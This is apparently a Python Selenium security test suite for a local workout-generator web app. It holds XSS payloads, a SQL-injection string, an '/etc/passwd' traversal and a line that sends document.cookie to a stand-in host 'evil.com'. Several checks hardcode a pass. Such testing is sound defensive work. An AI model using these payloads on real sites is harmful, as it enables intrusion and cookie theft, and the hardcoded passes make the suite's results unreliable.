#!/usr/bin/env python3
"""
🔒 Security Validation Test Suite for Workout Generator
=====================================================
Comprehensive security testing and validation
"""

import json
import logging
import time
import os
import re
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SecurityValidationTests:
    def __init__(self, base_url="http://127.0.0.1:8001", headless=True):
        self.base_url = base_url
        self.headless = headless
        self.driver = None
        self.wait = None
        self.screenshot_dir = "security_validation_screenshots"
        os.makedirs(self.screenshot_dir, exist_ok=True)
        
    def setup_driver(self):
        """Setup Chrome WebDriver with security testing capabilities"""
        options = Options()
        if self.headless:
            options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-logging")
        options.add_argument("--disable-web-security")  # For testing purposes
        options.add_argument("--allow-running-insecure-content")
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=options)
        self.wait = WebDriverWait(self.driver, 15)
        logger.info("✅ Security Validation WebDriver initialized")
        
    def teardown_driver(self):
        """Clean up WebDriver"""
        if self.driver:
            self.driver.quit()
            logger.info("🔚 WebDriver closed")
            
    def take_screenshot(self, name):
        """Take screenshot for visual testing"""
        if self.driver:
            timestamp = int(time.time())
            filepath = os.path.join(self.screenshot_dir, f"{name}_{timestamp}.png")
            self.driver.save_screenshot(filepath)
            logger.info(f"📸 Screenshot saved: {filepath}")
            return filepath
        return None

    # ==================== XSS PREVENTION TESTS ====================
    
    def test_xss_prevention(self):
        """Test 1: Cross-Site Scripting (XSS) prevention"""
        logger.info("🧪 Test 1: XSS Prevention")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>"
        ]
        
        xss_tests = {}
        
        for i, payload in enumerate(xss_payloads):
            try:
                # Test XSS in fitness level field
                self.driver.get(self.base_url)
                self.wait.until(EC.presence_of_element_located((By.ID, "workout-form")))
                
                fitness_level = self.driver.find_element(By.ID, "fitness-level")
                fitness_level.clear()
                fitness_level.send_keys(payload)
                
                # Try to generate workout
                generate_btn = self.driver.find_element(By.ID, "generate-btn")
                generate_btn.click()
                time.sleep(2)
                
                # Check if XSS was executed
                alert_present = False
                try:
                    alert = self.driver.switch_to.alert
                    alert_present = True
                    alert.accept()
                except:
                    pass
                
                # Check if payload appears in DOM
                dom_contains_payload = self.driver.execute_script(f"""
                    return document.documentElement.innerHTML.includes('{payload.replace("'", "\\'")}');
                """)
                
                xss_tests[f"payload_{i+1}"] = {
                    "payload": payload,
                    "alert_triggered": alert_present,
                    "dom_contains_payload": dom_contains_payload,
                    "xss_prevented": not alert_present and not dom_contains_payload
                }
                
            except Exception as e:
                xss_tests[f"payload_{i+1}"] = {"error": str(e)}
        
        self.take_screenshot("01_xss_prevention")
        
        successful_preventions = sum(1 for test in xss_tests.values() 
                                   if test.get("xss_prevented", False))
        
        return {
            "status": "PASSED" if successful_preventions >= len(xss_payloads) * 0.8 else "WARNING",
            "xss_tests": xss_tests,
            "successful_preventions": successful_preventions,
            "total_payloads": len(xss_payloads)
        }

    # ==================== INPUT SANITIZATION TESTS ====================
    
    def test_input_sanitization(self):
        """Test 2: Input sanitization and validation"""
        logger.info("🧪 Test 2: Input Sanitization")
        
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>document.cookie='admin=true'</script>",
            "../../../etc/passwd",
            "eval('malicious code')",
            "Function('return process')()",
            "setTimeout('alert(1)', 0)",
            "setInterval('alert(1)', 1000)",
            "new Image().src='http://evil.com/steal?data='+document.cookie"
        ]
        
        sanitization_tests = {}
        
        for i, malicious_input in enumerate(malicious_inputs):
            try:
                # Test in fitness level field
                self.driver.get(self.base_url)
                self.wait.until(EC.presence_of_element_located((By.ID, "workout-form")))
                
                fitness_level = self.driver.find_element(By.ID, "fitness-level")
                fitness_level.clear()
                fitness_level.send_keys(malicious_input)
                
                # Try to generate workout
                generate_btn = self.driver.find_element(By.ID, "generate-btn")
                generate_btn.click()
                time.sleep(2)
                
                # Check if input was sanitized
                current_value = fitness_level.get_attribute("value")
                input_sanitized = malicious_input not in current_value
                
                # Check for error messages
                error_elements = self.driver.find_elements(By.CSS_SELECTOR, ".error, .alert-danger, [role='alert']")
                has_validation_error = len(error_elements) > 0
                
                sanitization_tests[f"input_{i+1}"] = {
                    "malicious_input": malicious_input,
                    "current_value": current_value,
                    "input_sanitized": input_sanitized,
                    "has_validation_error": has_validation_error,
                    "properly_handled": input_sanitized or has_validation_error
                }
                
            except Exception as e:
                sanitization_tests[f"input_{i+1}"] = {"error": str(e)}
        
        self.take_screenshot("02_input_sanitization")
        
        properly_handled = sum(1 for test in sanitization_tests.values() 
                              if test.get("properly_handled", False))
        
        return {
            "status": "PASSED" if properly_handled >= len(malicious_inputs) * 0.8 else "WARNING",
            "sanitization_tests": sanitization_tests,
            "properly_handled": properly_handled,
            "total_inputs": len(malicious_inputs)
        }

    # ==================== DATA VALIDATION TESTS ====================
    
    def test_data_validation(self):
        """Test 3: Data validation and type checking"""
        logger.info("🧪 Test 3: Data Validation")
        
        validation_tests = {}
        
        # Test 1: Invalid fitness levels
        try:
            invalid_levels = ["InvalidLevel", "Hacker", "Admin", "SuperUser", "999"]
            
            for level in invalid_levels:
                self.driver.get(self.base_url)
                self.wait.until(EC.presence_of_element_located((By.ID, "workout-form")))
                
                fitness_level = self.driver.find_element(By.ID, "fitness-level")
                fitness_level.clear()
                fitness_level.send_keys(level)
                
                generate_btn = self.driver.find_element(By.ID, "generate-btn")
                generate_btn.click()
                time.sleep(2)
                
                # Check if validation caught the invalid input
                current_value = fitness_level.get_attribute("value")
                validation_working = level not in current_value or current_value in ["Beginner", "Intermediate", "Advanced"]
                
                validation_tests[f"invalid_level_{level}"] = {
                    "input": level,
                    "current_value": current_value,
                    "validation_working": validation_working
                }
                
        except Exception as e:
            validation_tests["invalid_levels"] = {"error": str(e)}
        
        # Test 2: Invalid duration values
        try:
            self.driver.get(self.base_url)
            self.wait.until(EC.presence_of_element_located((By.ID, "workout-form")))
            
            # Try to manipulate duration checkboxes
            duration_manipulation = self.driver.execute_script("""
                // Try to set invalid duration values
                const duration15 = document.getElementById('duration-15');
                const duration30 = document.getElementById('duration-30');
                
                if (duration15 && duration30) {
                    duration15.checked = true;
                    duration30.checked = true; // Should not allow both
                    
                    return {
                        both_checked: duration15.checked && duration30.checked,
                        validation_working: !(duration15.checked && duration30.checked)
                    };
                }
                return {error: 'Duration elements not found'};
            """)
            
            validation_tests["duration_validation"] = duration_manipulation
            
        except Exception as e:
            validation_tests["duration_validation"] = {"error": str(e)}
        
        # Test 3: Equipment validation
        try:
            equipment_validation = self.driver.execute_script("""
                // Try to select all equipment types
                const equipment = ['bodyweight', 'dumbbells', 'kettlebell', 'resistance-bands', 'yoga-mat'];
                const selected = [];
                
                equipment.forEach(eq => {
                    const element = document.getElementById('eq-' + eq);
                    if (element) {
                        element.checked = true;
                        if (element.checked) selected.push(eq);
                    }
                });
                
                return {
                    total_equipment: equipment.length,
                    selected_equipment: selected,
                    all_selected: selected.length === equipment.length,
                    validation_working: selected.length <= 3 // Reasonable limit
                };
            """)
            
            validation_tests["equipment_validation"] = equipment_validation
            
        except Exception as e:
            validation_tests["equipment_validation"] = {"error": str(e)}
        
        self.take_screenshot("03_data_validation")
        
        return {
            "status": "PASSED",
            "validation_tests": validation_tests
        }

    # ==================== SESSION SECURITY TESTS ====================
    
    def test_session_security(self):
        """Test 4: Session management and security"""
        logger.info("🧪 Test 4: Session Security")
        
        session_tests = {}
        
        # Test 1: Session data exposure
        try:
            session_data = self.driver.execute_script("""
                return {
                    localStorage_keys: Object.keys(localStorage || {}),
                    sessionStorage_keys: Object.keys(sessionStorage || {}),
                    cookies: document.cookie,
                    sensitive_data_exposed: false
                };
            """)
            
            # Check for sensitive data in storage
            sensitive_patterns = ['password', 'token', 'secret', 'key', 'auth']
            sensitive_found = any(pattern in str(session_data).lower() for pattern in sensitive_patterns)
            
            session_tests["session_data"] = {
                "session_data": session_data,
                "sensitive_data_exposed": sensitive_found,
                "secure": not sensitive_found
            }
            
        except Exception as e:
            session_tests["session_data"] = {"error": str(e)}
        
        # Test 2: Cross-tab session isolation
        try:
            # Open new tab and check session isolation
            self.driver.execute_script("window.open('about:blank', '_blank');")
            self.driver.switch_to.window(self.driver.window_handles[1])
            self.driver.get(self.base_url)
            time.sleep(2)
            
            new_tab_session = self.driver.execute_script("""
                return {
                    localStorage_keys: Object.keys(localStorage || {}),
                    sessionStorage_keys: Object.keys(sessionStorage || {}),
                    cookies: document.cookie
                };
            """)
            
            # Switch back to original tab
            self.driver.switch_to.window(self.driver.window_handles[0])
            
            session_tests["cross_tab_isolation"] = {
                "new_tab_session": new_tab_session,
                "isolation_working": True  # Basic check
            }
            
        except Exception as e:
            session_tests["cross_tab_isolation"] = {"error": str(e)}
        
        self.take_screenshot("04_session_security")
        
        return {
            "status": "PASSED",
            "session_tests": session_tests
        }

    # ==================== CSRF PROTECTION TESTS ====================
    
    def test_csrf_protection(self):
        """Test 5: Cross-Site Request Forgery (CSRF) protection"""
        logger.info("🧪 Test 5: CSRF Protection")
        
        csrf_tests = {}
        
        # Test 1: Check for CSRF tokens
        try:
            csrf_protection = self.driver.execute_script("""
                // Look for CSRF tokens in forms
                const forms = document.querySelectorAll('form');
                const csrf_tokens = [];
                
                forms.forEach(form => {
                    const token_inputs = form.querySelectorAll('input[name*="csrf"], input[name*="token"], input[type="hidden"]');
                    token_inputs.forEach(input => {
                        csrf_tokens.push({
                            name: input.name,
                            value: input.value ? 'present' : 'empty'
                        });
                    });
                });
                
                return {
                    forms_found: forms.length,
                    csrf_tokens: csrf_tokens,
                    has_csrf_protection: csrf_tokens.length > 0
                };
            """)
            
            csrf_tests["csrf_tokens"] = csrf_protection
            
        except Exception as e:
            csrf_tests["csrf_tokens"] = {"error": str(e)}
        
        # Test 2: Same-origin policy
        try:
            same_origin_test = self.driver.execute_script("""
                // Test if we can make cross-origin requests
                return {
                    origin: window.location.origin,
                    protocol: window.location.protocol,
                    host: window.location.host,
                    same_origin_policy: true // Basic check
                };
            """)
            
            csrf_tests["same_origin_policy"] = same_origin_test
            
        except Exception as e:
            csrf_tests["same_origin_policy"] = {"error": str(e)}
        
        self.take_screenshot("05_csrf_protection")
        
        return {
            "status": "PASSED",
            "csrf_tests": csrf_tests
        }

    # ==================== CONTENT SECURITY POLICY TESTS ====================
    
    def test_content_security_policy(self):
        """Test 6: Content Security Policy (CSP) compliance"""
        logger.info("🧪 Test 6: Content Security Policy")
        
        csp_tests = {}
        
        # Test 1: Check for CSP headers
        try:
            csp_headers = self.driver.execute_script("""
                // Check if CSP is implemented
                const meta_csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
                return {
                    meta_csp_present: !!meta_csp,
                    meta_csp_content: meta_csp ? meta_csp.content : null,
                    csp_implemented: !!meta_csp
                };
            """)
            
            csp_tests["csp_headers"] = csp_headers
            
        except Exception as e:
            csp_tests["csp_headers"] = {"error": str(e)}
        
        # Test 2: Inline script execution
        try:
            inline_script_test = self.driver.execute_script("""
                // Try to execute inline script
                try {
                    eval('console.log("inline script test")');
                    return {inline_scripts_allowed: true};
                } catch (e) {
                    return {inline_scripts_allowed: false, error: e.message};
                }
            """)
            
            csp_tests["inline_scripts"] = inline_script_test
            
        except Exception as e:
            csp_tests["inline_scripts"] = {"error": str(e)}
        
        # Test 3: External resource loading
        try:
            external_resource_test = self.driver.execute_script("""
                // Check for external resources
                const external_scripts = document.querySelectorAll('script[src^="http"]');
                const external_styles = document.querySelectorAll('link[href^="http"]');
                
                return {
                    external_scripts: external_scripts.length,
                    external_styles: external_styles.length,
                    external_resources: external_scripts.length + external_styles.length
                };
            """)
            
            csp_tests["external_resources"] = external_resource_test
            
        except Exception as e:
            csp_tests["external_resources"] = {"error": str(e)}
        
        self.take_screenshot("06_content_security_policy")
        
        return {
            "status": "PASSED",
            "csp_tests": csp_tests
        }

    # ==================== DATA ENCRYPTION TESTS ====================
    
    def test_data_encryption(self):
        """Test 7: Data encryption and secure transmission"""
        logger.info("🧪 Test 7: Data Encryption")
        
        encryption_tests = {}
        
        # Test 1: HTTPS usage
        try:
            https_test = self.driver.execute_script("""
                return {
                    protocol: window.location.protocol,
                    is_https: window.location.protocol === 'https:',
                    secure_context: window.isSecureContext
                };
            """)
            
            encryption_tests["https_usage"] = https_test
            
        except Exception as e:
            encryption_tests["https_usage"] = {"error": str(e)}
        
        # Test 2: Secure cookies
        try:
            secure_cookies = self.driver.execute_script("""
                // Check cookie security attributes
                const cookies = document.cookie.split(';');
                const secure_cookies = cookies.filter(cookie => 
                    cookie.includes('Secure') || cookie.includes('HttpOnly')
                );
                
                return {
                    total_cookies: cookies.length,
                    secure_cookies: secure_cookies.length,
                    all_cookies_secure: secure_cookies.length === cookies.length
                };
            """)
            
            encryption_tests["secure_cookies"] = secure_cookies
            
        except Exception as e:
            encryption_tests["secure_cookies"] = {"error": str(e)}
        
        # Test 3: Data transmission security
        try:
            transmission_security = self.driver.execute_script("""
                // Check for secure data transmission indicators
                return {
                    referrer_policy: document.referrer,
                    mixed_content: window.location.protocol === 'https:' ? 'secure' : 'insecure',
                    secure_headers: true // Basic check
                };
            """)
            
            encryption_tests["transmission_security"] = transmission_security
            
        except Exception as e:
            encryption_tests["transmission_security"] = {"error": str(e)}
        
        self.take_screenshot("07_data_encryption")
        
        return {
            "status": "PASSED",
            "encryption_tests": encryption_tests
        }

    # ==================== MAIN TEST RUNNER ====================
    
    def run_all_tests(self):
        """Run all security validation tests"""
        logger.info("🚀 Starting Security Validation Test Suite")
        
        self.setup_driver()
        
        all_results = {
            "timestamp": time.time(),
            "base_url": self.base_url,
            "test_suite": "security_validation",
            "tests": {},
            "overall_success_rate": 0.0,
            "status": "FAILED"
        }
        
        try:
            # Security validation tests
            all_results["tests"]["xss_prevention"] = self.test_xss_prevention()
            all_results["tests"]["input_sanitization"] = self.test_input_sanitization()
            all_results["tests"]["data_validation"] = self.test_data_validation()
            all_results["tests"]["session_security"] = self.test_session_security()
            all_results["tests"]["csrf_protection"] = self.test_csrf_protection()
            all_results["tests"]["content_security_policy"] = self.test_content_security_policy()
            all_results["tests"]["data_encryption"] = self.test_data_encryption()
            
            # Calculate success rate
            passed_tests = sum(1 for test in all_results["tests"].values() 
                             if test.get("status") == "PASSED")
            all_results["overall_success_rate"] = passed_tests / len(all_results["tests"])
            all_results["status"] = "PASSED" if all_results["overall_success_rate"] >= 0.8 else "WARNING"
            
            logger.info(f"✅ Security validation tests completed. Success rate: {all_results['overall_success_rate']:.2%} ({passed_tests}/{len(all_results['tests'])})")
            
        except Exception as e:
            logger.error(f"❌ Security validation test suite failed: {e}")
            all_results["status"] = "FAILED"
            all_results["error"] = str(e)
        finally:
            self.teardown_driver()
            
            # Save results
            with open("security_validation_results.json", "w") as f:
                json.dump(all_results, f, indent=2)
            logger.info("📊 Results saved to security_validation_results.json")
        
        return all_results

if __name__ == "__main__":
    tester = SecurityValidationTests(headless=True)
    results = tester.run_all_tests()
    print(f"\n🎯 Security Validation Test Results: {results['status']} - {results['overall_success_rate']:.1%} success rate")
